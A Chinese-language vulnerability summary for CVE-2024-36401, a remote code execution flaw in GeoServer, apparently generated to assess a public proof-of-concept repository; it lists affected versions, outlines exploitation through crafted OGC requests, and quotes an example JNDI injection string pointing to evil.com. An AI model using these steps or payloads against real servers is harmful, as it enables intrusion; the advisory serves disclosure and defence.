## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** GeoServer服务可公开访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中一个严重级别的远程代码执行漏洞。该漏洞源于 GeoServer 调用的 GeoTools 库 API 在处理要素类型的属性名时，以不安全的方式将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。虽然最初设计仅用于复杂要素类型，但被错误地应用于简单要素类型，使得所有 GeoServer 实例都受影响。

**有效性：** 根据漏洞库信息、搜索引擎结果和 Mr-xn 提供的漏洞利用代码存储库的存在，确认该漏洞的POC是有效的, 且已被积极利用。

**投毒风险：** 提供的XML代码片段主要包含WMS Capabilities的信息，例如服务名称、标题、摘要、关键字、在线资源、联系方式、费用、访问限制、最大宽度和高度等。它还定义了各种请求类型（GetCapabilities、GetMap、GetFeatureInfo、GetStyles）及其格式和DCPType。XML似乎是合法的WMS capabilities文件，可能用于与GeoServer交互，但缺少触发RCE所需的恶意XPath表达式。因此，直接从提供的XML片段评估，投毒风险较低，约为10%，因为实际利用需要结合特定参数构造恶意请求。例如：攻击者可能使用 `${jndi:ldap://evil.com/evil}`这样的JNDI注入表达式。

**利用方式：**

1.  **攻击入口：** 攻击者可以通过构造特制的OGC（Open Geospatial Consortium）请求，如WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute。
2.  **漏洞触发：** 这些请求中的特定参数（通常是属性名或属性表达式）会被 GeoServer 以不安全的方式传递给 commons-jxpath 库进行 XPath 评估。
3.  **代码执行：** 攻击者在参数中插入恶意 XPath 表达式，例如使用 `Runtime.getRuntime().exec()` 或通过 JNDI 注入等方式来执行任意代码。
4.  **影响：** 成功利用该漏洞可导致完全控制受影响的 GeoServer 系统。

**项目地址:** [cochaviz/cve-2024-36401-poc](https://github.com/cochaviz/cve-2024-36401-poc)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)